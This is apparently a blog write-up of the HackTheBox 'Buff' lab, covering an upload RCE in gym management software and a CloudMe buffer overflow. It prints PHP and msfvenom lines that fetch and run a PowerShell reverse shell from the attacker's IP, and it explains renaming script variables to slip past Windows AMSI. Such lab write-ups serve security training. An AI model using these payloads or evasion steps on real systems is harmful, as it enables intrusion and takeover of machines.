---

title: HackTheBox - Buff
layout: post
date: 2020-11-21 23:00:00 +0800

---

![837a41a8d375e59f0ac06ab5a9ad1845.png](/images/htb-buff/dab7769c8e8b4cf782ed818047e0f87a.png)

### 0. Preface

Due to Windows Defender/AMSI, we are now having to mask malicious PowerShell scripts, even though it was uploaded using IEX. I also spent quite a bit of time experimenting with different buffer overflow POCs, but eventually got the right one. 

In this box, we will be tackling: 

1. Careful reading and exploiting a web application for RCE
2. Masking malicious PowerShell scripts to get past Windows AMSI
3. **BUFF**er overflow on CloudMe

<!--excerpt-->

---

### 1. Preliminary NMAP Scan
```bash
sudo nmap -sC -sV -oN nmap.txt -p- 10.10.10.198 -v
```

![c5ccb757d2407bd677b1f856b3abc878.png](/images/htb-buff/1b373446f1a442f69cf71b037be6ed8c.png)

Only two ports are open here. Port 8080 seems to be running a web server on Apache. Port 7680 seems to be running pando-pub, a file transfer service of some kind. 

Let's first check out the web server on port 8080. 

### 2. Web Server RCE Exploit

![a5953062e2d60bf48cec208da5b691f5.png](/images/htb-buff/7814d07ccb0a497da8ef5e4833b2e253.png)

So we get to this gym website. Let's try SQL injection on the login username and password on the top right. 

We don't get any useful results out of that, so let's move on to running `gobuster`. 

```bash
gobuster dir -u http://10.10.10.198:8080 -x php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt -t 50
```

Checking out some of these subdirectories, there's nothing really useful that we are able to use. 

![f759bc6b50e0b840ffc06352eea2e774.png](/images/htb-buff/139dc25fab7943c9886e267757cb6f59.png)

On further examination of the website, we will see that this website is a Gym Management Software v1.0 made by `projectworlds.in`. 

A quick Google search nets us [this unauthenticated RCE exploit](https://www.exploit-db.com/exploits/48506). As per the instructions in the comments of the code, it breaks down how the exploit works. 

TL;DR: 

1. Navigate to `/upload.php?id=filename`. 
2. Upload an image with a double extension, e.g. `file.php.png`. 
3. Add the malicious php code to the file. 
4. Navigate to `/upload/filename.php` to trigger the script. 

Let's get to work. 

First, we navigate to `http://10.10.10.198:8080/upload.php?id=pwned`. Next, we create a POST request to `http://10.10.10.198:8080/upload.php?id=pwned` and proxy that to Burpsuite. 

Here's what the POST request looks like: 

![03e5a1f3c75814d8adc49705c181a32f.png](/images/htb-buff/64e177dcea2448b0847aafbfb6b24289.png)

Now, we can navigate to `http://10.10.10.198:8080/upload/pwned.php` to trigger the script. 

![da8d89d7d5aa319c6bd0f41afb6d881a.png](/images/htb-buff/2304308ff34f468fba1b99617a8bdc9e.png)

This looks like a Windows 10 machine running a XAMPP stack. Now we know that we can use PowerShell to get us a reverse shell instead. 

### 3. PowerShell Reverse Shell

There's a collection of really nice framework/tools [called Nishang](https://github.com/samratashok/nishang), which is primarily used for pentesting Windows machines. 

We will be using `Invoke-PowerShellTcp.ps1` to get our reverse shell. First, however, we need to remove the help content (the stuff *before* the `Invoke-PowerShellTcp()` function) and rename the variables inside the script so it doesn't get blocked by [Windows AMSI](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal) when we try to run it. 

You can replace the variables (the ones prepended with `$`) with anything. 

Let's add the following line to the bottom of the PowerShell script so it automatically triggers the moment the script is uploaded. 

```powershell
cb -rev -IPAddress 10.10.14.43 -Port 8888
```

The `Invoke-PowerShellTcp()` function has been replaced with `cb()`, and the `-Reverse` flag has been replaced with `-rev`. All the rest of the variables are replaced with garbage. 

Next, let's append the following into the POST request in the place of `phpinfo()`. 

```php 
<?php echo shell_exec("powershell -noni -nop -ep bypass -c iex (new-object net.webclient).downloadstring('http://10.10.14.43:8888/Invoke-PowerShellTcp.ps1') 2>&1 "); ?>
```

What this does is it downloads the script from our machine, then executes the script in memory. Do remember to setup a Netcat listener as well as a python3 http.server before triggering this. 

![3c288634aafde15dfe515c78555a7d57.png](/images/htb-buff/fd7081c203094abf9898395558367f37.png)

![5ce7a354b48c67bd11c73fcd75182121.png](/images/htb-buff/5da276d6b971472488b279367106b60f.png)

Let's grab the user flag on the desktop first.

![98a25b964c8f02fcf62958344cfa4bca.png](/images/htb-buff/f5011054dd9546ca8be34a29009556e6.png)

### 4. Further Enumeration, Buffer Overflow

Now let's start enumerating this. Checking out the `Program Files` and `Program Files (x86)` folders, we don't see much of use. CUAssistant has a [vulnerability](https://ling.re/windows-10-culauncher-exploit/) that is exploitable, but our user does not have rights to write to `C:\`, so we can't make use of that. 

![975795f743692d89ceb017c404f68f11.png](/images/htb-buff/e4599a023e96431aaf0d0d06304fca4b.png)

Moving on, we find `CloudMe_1112.exe` inside Shaun's downloads folder. 

![00f9a8b712864a3a8cde9a0633ebb950.png](/images/htb-buff/dfc6c3b9970b46a8928968078037caeb.png)

There is a buffer overflow exploit available [here](https://www.exploit-db.com/exploits/48389). Since CloudMe listens on port 8888, let's first confirm that the service is alive by running `netstat -ano | findstr 8888`.

![7f45f7935678e65ac5133c3cf90edf07.png](/images/htb-buff/63fea895276d47138ad53d3513a4fc98.png)

Since the service is only listening on localhost, we will need to use `plink` to tunnel the traffic back to our machine, so that we can access that service as localhost.

First we need to upload `plink.exe` to the machine using `Invoke-WebRequest`, then run the following command.

```cmd
echo y | .\plink.exe 10.10.14.43 -P 9922 -l kali -pw 'REDACTEDPASSWORD' -R 4545:127.0.0.1:8888
```

Note that the `echo y` is to allow `plink.exe` to add the SSH host key of your machine to SSH's cache. If `echo y` is not passed into `plink.exe`, it is likely that the reverse tunnel will not work. 

After running `plink.exe`, do note that you will no longer be able to enter commands in the remote machine as you will enter an SSH session with your Kali machine. 

Press Ctrl+C to send SIGINT and trigger the reverse shell again. The SSH tunnel should still be alive. We can check using `netstat` on the Kali machine. 

```bash
netstat -antp | grep 4545
```

![a0271136c31fca638a37e9fc2078165b.png](/images/htb-buff/451842da37a047acb665edb6da7d03e8.png)

Before we proceed further, if you have not done reverse SSH tunneling before and find the above confusing, I recommend watching [this video by VbScrub](https://www.youtube.com/watch?v=JDUrT3IEzLI) to better understand the concept. 

Next, to prove that the exploit works, let us replace the `calc.exe` shellcode with a shellcode that executes `notepad.exe` instead. The reasoning behind this is that `calc.exe` in Windows 10 will call a UWP app, which may be stripped from the installation. `Notepad.exe` is a safer alternative to test with. 

```bash
msfvenom -a x86 -p windows/exec CMD=notepad.exe -b '\x00\x0A\x0D' -f python -o shellcode
```

![ab488b05a7aaecb19490133f94b14293.png](/images/htb-buff/13e7a01558eb41ddae16af68354c21e8.png)

Before running the exploit, we will change the target port inside the python exploit code to 4545. This will run the exploit on `localhost:4545`, which will then get tunneled over SSH to the remote machine on `localhost:8888`.

![068cf59035bbaa76858942e73d8e76e0.png](/images/htb-buff/30323db9e2a74ec4902d2346c655cabd.png)

Let's run the exploit with `python2 exploit.py`, then go over to the remote machine and run `Get-Process notepad`. We should see a notepad process running.

![5a4e14fc921322b399560034f7acc7f8.png](/images/htb-buff/24f5eb63e9ce413cad4f81a6aec97b37.png)

Awesome. 

Now we are ready to replace the shellcode with a reverse shell. We can make use of the same Nishang `Invoke-PowerShellTcp.ps1` script. As before, we can download and run the script in memory. 

Generate the shellcode using the following, and replace it in `exploit.py`. 

```bash
msfvenom -a x86 -p windows/exec CMD="powershell -noni -nop -ep bypass -c iex (New-Object Net.WebClient).DownloadString('http://10.10.14.43:8888/Invoke-PowerShellTcp.ps1')" -b '\x00\x0A\x0D' -f python -o pwsh_shellcode
```

![a3a3164afcf59d44b5028a6239289cb6.png](/images/htb-buff/e655554d20844604badde75a4b4be87e.png)

Now, start a Netcat listener on port 8000, and a python3 http.server on port 8888. Now, run the exploit again using `python2 exploit.py` and wait a bit for the reverse shell. 

![8a7969bc1d0424c35c4288de019b9b62.png](/images/htb-buff/0b81a4e272e84228881927c61e0d2c54.png)

And we have rooted the machine.